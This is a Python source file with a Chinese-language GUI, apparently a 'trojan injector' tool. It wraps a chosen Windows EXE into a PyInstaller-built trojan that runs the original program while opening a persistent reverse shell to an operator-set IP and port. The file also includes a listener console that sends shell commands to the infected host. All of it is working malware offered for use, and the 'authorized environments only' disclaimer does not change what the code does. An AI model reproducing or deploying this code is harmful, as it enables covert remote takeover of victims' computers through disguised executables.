# -*- coding: utf-8 -*-
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import os
import sys
import threading
import socket
import time
import shutil
import platform
import subprocess
import tempfile
import base64

class RealCommandConsole:
    def __init__(self, master, host, port):
        self.master = master
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.connected = False
        self.running = True
        self.console_open = True
        
        self.setup_console_ui()
        self.start_listener()
    
    def setup_console_ui(self):
        """设置命令控制台界面"""
        self.window = tk.Toplevel(self.master)
        self.window.title(f"命令控制台 - 监听 {self.host}:{self.port}")
        self.window.geometry("900x700")
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)
        
        # 连接状态显示
        status_frame = ttk.Frame(self.window)
        status_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.status_var = tk.StringVar(value="正在启动监听...")
        status_label = ttk.Label(status_frame, textvariable=self.status_var, 
                               foreground="blue", font=("Arial", 10, "bold"))
        status_label.pack(side=tk.LEFT)
        
        ttk.Button(status_frame, text="停止监听", command=self.stop_listener).pack(side=tk.RIGHT)
        ttk.Button(status_frame, text="重启监听", command=self.restart_listener).pack(side=tk.RIGHT, padx=5)
        
        # 输出区域
        output_frame = ttk.LabelFrame(self.window, text="命令输出", padding="5")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.output_text = scrolledtext.ScrolledText(
            output_frame, 
            height=20,
            wrap=tk.WORD,
            bg='#1e1e1e',
            fg='#00ff00',
            font=('Consolas', 10),
            insertbackground='white'
        )
        self.output_text.pack(fill=tk.BOTH, expand=True)
        
        # 输入区域
        input_frame = ttk.Frame(self.window)
        input_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(input_frame, text="命令:", font=("Arial", 10)).pack(side=tk.LEFT)
        
        self.command_var = tk.StringVar()
        self.command_entry = ttk.Entry(input_frame, textvariable=self.command_var, 
                                     width=60, font=("Arial", 10))
        self.command_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.command_entry.bind('<Return>', self.send_command)
        
        ttk.Button(input_frame, text="发送命令", command=self.send_command).pack(side=tk.LEFT, padx=5)
        ttk.Button(input_frame, text="清空输出", command=self.clear_output).pack(side=tk.LEFT, padx=5)
        
        # 常用命令按钮
        common_frame = ttk.LabelFrame(self.window, text="快捷命令", padding="5")
        common_frame.pack(fill=tk.X, padx=10, pady=5)
        
        commands = [
            ("系统信息", "systeminfo"),
            ("进程列表", "tasklist"),
            ("网络信息", "ipconfig"),
            ("文件列表", "dir"),
            ("用户信息", "whoami"),
            ("网络连接", "netstat -an"),
            ("服务列表", "sc query"),
            ("环境变量", "set")
        ]
        
        for i, (text, cmd) in enumerate(commands):
            btn = ttk.Button(common_frame, text=text, 
                           command=lambda c=cmd: self.quick_command(c))
            btn.grid(row=i//4, column=i%4, padx=2, pady=2, sticky="ew")
        
        for i in range(4):
            common_frame.columnconfigure(i, weight=1)
    
    def quick_command(self, command):
        """快速发送命令"""
        self.command_var.set(command)
        self.send_command()
    
    def start_listener(self):
        """启动监听器"""
        def listener_thread():
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind((self.host, self.port))
                self.server_socket.listen(1)
                self.server_socket.settimeout(1.0)
                
                self.log_output(f"[+] 监听器启动成功 {self.host}:{self.port}\n")
                self.status_var.set(f"监听中 - 等待连接...")
                
                while self.running and self.console_open:
                    try:
                        self.client_socket, addr = self.server_socket.accept()
                        self.connected = True
                        self.status_var.set(f"已连接 - {addr[0]}:{addr[1]}")
                        self.log_output(f"[+] 客户端连接来自: {addr[0]}:{addr[1]}\n")
                        self.log_output("[+] 现在可以执行命令了\n")
                        
                        # 启动接收线程
                        receive_thread = threading.Thread(target=self.receive_data, daemon=True)
                        receive_thread.start()
                        break
                    except socket.timeout:
                        continue
                    except Exception as e:
                        if self.running and self.console_open:
                            self.log_output(f"[-] 接受连接错误: {str(e)}\n")
                        break
                        
            except Exception as e:
                self.log_output(f"[-] 监听器启动失败: {str(e)}\n")
                self.status_var.set("监听失败")
        
        threading.Thread(target=listener_thread, daemon=True).start()
    
    def receive_data(self):
        """接收数据线程"""
        while self.connected and self.client_socket and self.console_open:
            try:
                self.client_socket.settimeout(1.0)
                data = self.client_socket.recv(4096)
                if data:
                    decoded_data = data.decode('utf-8', errors='ignore')
                    self.log_output(decoded_data)
                else:
                    # 连接关闭
                    self.connected = False
                    self.status_var.set("连接断开")
                    self.log_output("[-] 客户端断开连接\n")
                    break
            except socket.timeout:
                continue
            except Exception as e:
                if self.connected and self.console_open:
                    self.log_output(f"[-] 接收数据错误: {str(e)}\n")
                break
    
    def send_command(self, event=None):
        """发送命令"""
        if not self.connected or not self.client_socket:
            self.log_output("[-] 未连接到客户端\n")
            return
        
        command = self.command_var.get().strip()
        if not command:
            return
        
        try:
            self.log_output(f"[>] 执行命令: {command}\n")
            # 发送命令
            self.client_socket.sendall((command + "\n").encode('utf-8'))
            self.command_var.set("")
            
        except Exception as e:
            self.log_output(f"[-] 发送命令失败: {str(e)}\n")
            self.connected = False
            self.status_var.set("连接断开")
    
    def log_output(self, text):
        """在输出区域显示文本"""
        if self.console_open:
            self.output_text.insert(tk.END, text)
            self.output_text.see(tk.END)
            self.output_text.update()
    
    def clear_output(self):
        """清空输出区域"""
        self.output_text.delete(1.0, tk.END)
    
    def restart_listener(self):
        """重启监听器"""
        self.stop_listener()
        time.sleep(1)
        self.running = True
        self.start_listener()
    
    def stop_listener(self):
        """停止监听"""
        self.running = False
        self.connected = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        self.status_var.set("监听已停止")
        self.log_output("[!] 监听器已停止\n")
    
    def on_close(self):
        """关闭窗口"""
        self.console_open = False
        self.stop_listener()
        self.window.destroy()

class AdvancedTrojanInjector:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("高级木马注入器 - ET团队")
        self.root.geometry("850x700")
        self.root.resizable(True, True)
        
        # 设置图标
        self.set_window_icon()
        
        # 设置变量
        self.file_path = tk.StringVar()
        self.ip_address = tk.StringVar(value="0.0.0.0")
        self.port_number = tk.StringVar(value="4444")
        self.output_dir = tk.StringVar(value=os.getcwd())
        self.status_text = tk.StringVar(value="就绪")
        
        self.create_widgets()
        
    def set_window_icon(self):
        """设置窗口图标"""
        try:
            icon_path = os.path.join("ASS", "a.png")
            if os.path.exists(icon_path):
                # 使用PIL设置图标
                try:
                    from PIL import Image, ImageTk
                    img = Image.open(icon_path)
                    photo = ImageTk.PhotoImage(img)
                    self.root.iconphoto(False, photo)
                except ImportError:
                    # 如果PIL不可用，使用默认图标
                    pass
        except:
            pass
    
    def create_widgets(self):
        # 创建菜单
        menubar = tk.Menu(self.root)
        help_menu = tk.Menu(menubar, tearoff=0)
        help_menu.add_command(label="关于作者", command=self.show_about)
        menubar.add_cascade(label="帮助", menu=help_menu)
        self.root.config(menu=menubar)
        
        # 主框架
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 标题
        title_label = ttk.Label(main_frame, text="高级木马注入器", 
                               font=("Arial", 18, "bold"), foreground="darkred")
        title_label.pack(pady=10)
        
        # 文件选择区域
        file_frame = ttk.LabelFrame(main_frame, text="1. 选择目标文件", padding="10")
        file_frame.pack(fill=tk.X, pady=10)
        
        file_entry_frame = ttk.Frame(file_frame)
        file_entry_frame.pack(fill=tk.X)
        
        ttk.Entry(file_entry_frame, textvariable=self.file_path, width=60, 
                 font=("Arial", 10)).pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        ttk.Button(file_entry_frame, text="浏览文件", command=self.browse_file).pack(side=tk.LEFT, padx=5)
        
        # 连接设置区域
        conn_frame = ttk.LabelFrame(main_frame, text="2. 设置监听参数", padding="10")
        conn_frame.pack(fill=tk.X, pady=10)
        
        conn_inner_frame = ttk.Frame(conn_frame)
        conn_inner_frame.pack(fill=tk.X)
        
        ttk.Label(conn_inner_frame, text="监听IP:", font=("Arial", 10)).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        ttk.Entry(conn_inner_frame, textvariable=self.ip_address, width=20, 
                 font=("Arial", 10)).grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(conn_inner_frame, text="监听端口:", font=("Arial", 10)).grid(row=0, column=2, sticky="w", padx=5, pady=5)
        ttk.Entry(conn_inner_frame, textvariable=self.port_number, width=10, 
                 font=("Arial", 10)).grid(row=0, column=3, padx=5, pady=5)
        
        # 输出设置区域
        output_frame = ttk.LabelFrame(main_frame, text="3. 设置输出目录", padding="10")
        output_frame.pack(fill=tk.X, pady=10)
        
        output_entry_frame = ttk.Frame(output_frame)
        output_entry_frame.pack(fill=tk.X)
        
        ttk.Entry(output_entry_frame, textvariable=self.output_dir, width=60, 
                 font=("Arial", 10)).pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        ttk.Button(output_entry_frame, text="浏览目录", command=self.browse_directory).pack(side=tk.LEFT, padx=5)
        
        # 按钮区域
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(pady=15)
        
        ttk.Button(button_frame, text="🚀 开始注入", command=self.start_injection, 
                  style="Accent.TButton").pack(side=tk.LEFT, padx=8)
        ttk.Button(button_frame, text="🔧 环境检测", command=self.check_environment).pack(side=tk.LEFT, padx=8)
        ttk.Button(button_frame, text="🗑️ 清空日志", command=self.clear_log).pack(side=tk.LEFT, padx=8)
        ttk.Button(button_frame, text="🖥️ 打开控制台", command=self.open_console).pack(side=tk.LEFT, padx=8)
        
        # 进度条
        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=10)
        
        # 状态标签
        status_label = ttk.Label(main_frame, textvariable=self.status_text, 
                               font=("Arial", 10), foreground="blue")
        status_label.pack(pady=5)
        
        # 日志区域
        log_frame = ttk.LabelFrame(main_frame, text="操作日志", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=18, wrap=tk.WORD, 
                                                font=("Consolas", 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        self.configure_styles()
    
    def configure_styles(self):
        style = ttk.Style()
        style.configure("Accent.TButton", foreground="white", background="#d9534f")
    
    def show_about(self):
        messagebox.showinfo("关于作者", 
                          "ET团队 - 专业安全测试工具\n\n"
                          "⚠️ 仅限授权环境使用！\n"
                          "⚠️ 遵守相关法律法规！\n\n"

                            "QQ号：2416444244")
    
    def browse_file(self):
        filename = filedialog.askopenfilename(
            title="选择要注入的文件",
            filetypes=[
                ("Windows程序", "*.exe"),
                ("所有文件", "*.*")
            ]
        )
        if filename:
            self.file_path.set(filename)
            self.log_message(f"📁 已选择文件: {filename}")
    
    def browse_directory(self):
        directory = filedialog.askdirectory(title="选择输出目录")
        if directory:
            self.output_dir.set(directory)
            self.log_message(f"📂 输出目录: {directory}")
    
    def log_message(self, message):
        timestamp = time.strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.root.update()
    
    def clear_log(self):
        self.log_text.delete(1.0, tk.END)
        self.log_message("🗑️ 日志已清空")
    
    def open_console(self):
        """打开命令控制台"""
        if not self.ip_address.get() or not self.port_number.get():
            messagebox.showerror("错误", "请先设置监听IP地址和端口")
            return
        
        try:
            port = int(self.port_number.get())
            if port < 1 or port > 65535:
                messagebox.showerror("错误", "端口号必须在1-65535之间")
                return
        except ValueError:
            messagebox.showerror("错误", "端口号必须是数字")
            return
        
        try:
            RealCommandConsole(self.root, self.ip_address.get(), port)
            self.log_message(f"🖥️ 打开控制台: {self.ip_address.get()}:{port}")
        except Exception as e:
            messagebox.showerror("错误", f"打开控制台失败: {str(e)}")
    
    def check_environment(self):
        self.log_message("🔧 开始环境检测...")
        self.log_message(f"✅ Python版本: {platform.python_version()}")
        self.log_message(f"✅ 操作系统: {platform.system()} {platform.release()}")
        
        try:
            total, used, free = shutil.disk_usage(".")
            free_gb = free // (2**30)
            self.log_message(f"✅ 磁盘空间: {free_gb}GB 可用")
        except Exception as e:
            self.log_message(f"⚠️ 无法检测磁盘空间: {e}")
        
        # 检查PyInstaller
        try:
            import PyInstaller
            self.log_message("✅ PyInstaller: 可用")
        except ImportError:
            self.log_message("❌ PyInstaller: 未安装，无法编译EXE")
        
        self.log_message("✅ 环境检测完成")
    
    def start_injection(self):
        if not self.file_path.get():
            messagebox.showerror("错误", "请选择要注入的文件")
            return
        
        if not self.ip_address.get():
            messagebox.showerror("错误", "请输入监听IP地址")
            return
        
        if not self.port_number.get():
            messagebox.showerror("错误", "请输入端口号")
            return
        
        try:
            port = int(self.port_number.get())
            if port < 1 or port > 65535:
                messagebox.showerror("错误", "端口号必须在1-65535之间")
                return
        except ValueError:
            messagebox.showerror("错误", "端口号必须是数字")
            return
        
        if not os.path.exists(self.output_dir.get()):
            messagebox.showerror("错误", "输出目录不存在")
            return
        
        self.progress.start()
        self.status_text.set("正在注入木马...")
        
        thread = threading.Thread(target=self.real_injection)
        thread.daemon = True
        thread.start()
    
    def real_injection(self):
        """真实的木马注入"""
        try:
            input_file = self.file_path.get()
            output_dir = self.output_dir.get()
            ip = self.ip_address.get()
            port = self.port_number.get()
            
            self.log_message("🚀 开始真实木马注入...")
            self.log_message(f"🎯 目标文件: {os.path.basename(input_file)}")
            self.log_message(f"🌐 监听地址: {ip}:{port}")
            
            if not os.path.exists(input_file):
                self.log_message("❌ 错误: 输入文件不存在")
                return
            
            file_ext = os.path.splitext(input_file)[1].lower()
            
            if file_ext == '.exe':
                result = self.create_standalone_trojan(input_file, output_dir, ip, port)
            else:
                self.log_message("❌ 错误: 不支持的文件类型")
                return
            
            if result and os.path.exists(result):
                file_size = os.path.getsize(result)
                self.log_message(f"✅ 木马生成成功!")
                self.log_message(f"📄 输出文件: {result}")
                self.log_message(f"📊 文件大小: {file_size:,} 字节")
                self.log_message("💡 使用方法:")
                self.log_message("   1. 保持控制台打开")
                self.log_message("   2. 运行生成的文件")
                self.log_message("   3. 在控制台中执行命令")
                self.status_text.set("注入完成")
                
                if messagebox.askyesno("完成", 
                    f"木马生成成功！\n\n"
                    f"文件: {os.path.basename(result)}\n"
                    f"大小: {file_size:,} 字节\n\n"
                    f"是否立即打开命令控制台？"):
                    self.root.after(1000, self.open_console)
            else:
                self.log_message("❌ 木马生成失败")
                self.status_text.set("注入失败")
                
        except Exception as e:
            self.log_message(f"❌ 注入错误: {str(e)}")
            self.status_text.set("注入错误")
        finally:
            self.progress.stop()
    
    def create_standalone_trojan(self, original_exe, output_dir, ip, port):
        """创建独立的木马程序"""
        try:
            self.log_message("🔄 创建独立木马程序...")
            
            base_name = os.path.splitext(os.path.basename(original_exe))[0]
            output_file = os.path.join(output_dir, f"{base_name}_trojan.exe")
            
            # 创建木马代码
            trojan_code = self.create_trojan_code(ip, port, original_exe)
            
            # 保存为Python文件
            py_file = os.path.join(output_dir, "trojan_temp.py")
            with open(py_file, 'w', encoding='utf-8') as f:
                f.write(trojan_code)
            
            self.log_message("🔨 编译木马程序...")
            
            # 使用PyInstaller编译
            try:
                import PyInstaller.__main__
                
                # 创建临时目录
                temp_dir = tempfile.mkdtemp()
                
                # 运行PyInstaller
                subprocess.run([
                    'pyinstaller', '--onefile', '--noconsole', '--clean',
                    '--distpath', output_dir,
                    '--workpath', temp_dir,
                    '--specpath', temp_dir,
                    '--name', f"{base_name}_trojan",
                    py_file
                ], check=True, capture_output=True, timeout=120)
                
                # 清理临时文件
                if os.path.exists(py_file):
                    os.remove(py_file)
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
                
                # 检查生成的EXE
                if os.path.exists(output_file):
                    self.log_message("✅ 木马程序编译成功")
                    return output_file
                else:
                    self.log_message("❌ 木马程序编译失败")
                    return None
                    
            except Exception as e:
                self.log_message(f"❌ PyInstaller编译失败: {e}")
                # 如果编译失败，创建Python脚本
                py_output = output_file.replace('.exe', '.py')
                shutil.copy2(py_file, py_output)
                if os.path.exists(py_file):
                    os.remove(py_file)
                self.log_message("⚠️ 已生成Python脚本代替EXE")
                return py_output
                
        except Exception as e:
            self.log_message(f"❌ 木马程序创建失败: {e}")
            return None
    
    def create_trojan_code(self, ip, port, original_exe):
        """创建木马代码"""
        return f'''# -*- coding: utf-8 -*-
import os
import sys
import socket
import subprocess
import threading
import time
import tempfile
import shutil

class AdvancedTrojan:
    def __init__(self, host, port, original_exe):
        self.host = host
        self.port = port
        self.original_exe = original_exe
        self.running = True
        
    def start_original_program(self):
        """启动原始程序"""
        try:
            if os.path.exists(self.original_exe):
                # 在工作目录中启动原始程序
                working_dir = os.path.dirname(self.original_exe)
                process = subprocess.Popen(
                    [self.original_exe],
                    cwd=working_dir,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
                )
                return process
        except Exception as e:
            pass
        return None
    
    def execute_command(self, command):
        """执行命令并返回输出"""
        try:
            # 使用cmd执行命令
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=30
            )
            output = result.stdout
            if result.stderr:
                output += "\\\\n错误: " + result.stderr
            return output
        except subprocess.TimeoutExpired:
            return "命令执行超时"
        except Exception as e:
            return f"命令执行错误: {{str(e)}}"
    
    def reverse_shell(self):
        """反向Shell"""
        while self.running:
            try:
                # 创建socket连接
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect(("{ip}", {port}))
                
                # 发送连接信息
                s.send(b"\\\\n[+] Reverse Shell Connected!\\\\n")
                s.send(f"[+] Client: {{socket.gethostname()}}\\\\n".encode())
                s.send(f"[+] OS: {{platform.system()}}\\\\n".encode())
                s.send(f"[+] User: {{os.getlogin() if hasattr(os, 'getlogin') else 'Unknown'}}\\\\n".encode())
                s.send(b"\\\\n")
                
                while self.running:
                    try:
                        # 接收命令
                        s.settimeout(1)
                        command = s.recv(4096).decode('utf-8', errors='ignore').strip()
                        
                        if not command:
                            continue
                            
                        if command.lower() in ['exit', 'quit']:
                            s.send(b"\\\\n[+] Connection closed\\\\n")
                            s.close()
                            return
                        
                        # 执行命令
                        output = self.execute_command(command)
                        s.send(output.encode())
                            
                    except socket.timeout:
                        continue
                    except Exception as e:
                        s.send(f"\\\\n[-] Command error: {{str(e)}}\\\\n".encode())
                        break
                        
            except Exception as e:
                # 连接失败，等待后重试
                time.sleep(10)
    
    def start(self):
        """启动木马"""
        # 启动原始程序
        original_process = self.start_original_program()
        
        # 启动反向Shell
        shell_thread = threading.Thread(target=self.reverse_shell)
        shell_thread.daemon = True
        shell_thread.start()
        
        # 保持程序运行
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            if original_process:
                original_process.terminate()

if __name__ == "__main__":
    import platform
    
    # 原始EXE路径
    original_exe_path = r"{original_exe}"
    
    # 创建并启动木马
    trojan = AdvancedTrojan("{ip}", {port}, original_exe_path)
    trojan.start()
'''

def main():
    try:
        print("启动高级木马注入器...")
        app = AdvancedTrojanInjector()
        app.log_message("✅ 高级木马注入器启动成功")
        app.log_message("🔒 ET团队 - 专业安全工具")
        app.log_message("⚠️ 仅限授权环境使用")
        app.log_message("💡 使用说明:")
        app.log_message("   1. 选择要注入的EXE文件")
        app.log_message("   2. 设置监听IP和端口")
        app.log_message("   3. 点击开始注入")
        app.log_message("   4. 打开控制台等待连接")
        app.log_message("   5. 运行生成的文件")
        app.root.mainloop()
    except Exception as e:
        print(f"启动错误: {e}")
        input("按回车键退出...")

if __name__ == "__main__":
    main()
